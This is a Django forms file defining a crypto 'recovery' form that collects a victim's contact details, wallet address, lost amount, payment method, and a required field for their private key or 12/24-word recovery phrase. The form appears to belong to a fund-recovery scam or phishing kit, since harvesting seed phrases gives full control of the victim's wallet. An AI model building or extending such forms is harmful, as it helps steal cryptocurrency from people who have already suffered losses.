


from django import forms
from .models import Recovery, Wallet

class RecoveryForm(forms.ModelForm):
    class Meta:
        model = Recovery
        fields = ['name', 'email', 'phone', 'wallet', 'wallet_address', 'recovery_phrase',
                  'lost_amount', 'loss_description', 'payment_method']
    
    wallet = forms.ModelChoiceField(
        queryset=Wallet.objects.all(),
        empty_label="Select a wallet",
        widget=forms.Select(attrs={'class': 'wallet-select'})
    )

    wallet_address = forms.CharField(
        max_length=255,
        required=True,
        widget=forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Enter wallet address'})
    )

    recovery_phrase = forms.CharField(
        max_length=255,
        required=True,
        widget=forms.Textarea(attrs={'class': 'form-control', 'placeholder': '12 private key / 24-word recovery phrase'})
    )

    def __init__(self, *args, **kwargs):
        super(RecoveryForm, self).__init__(*args, **kwargs)
        # Add the 'form-control' class to all fields
        for field in self.fields.values():
            field.widget.attrs.update({'class': 'form-control'})
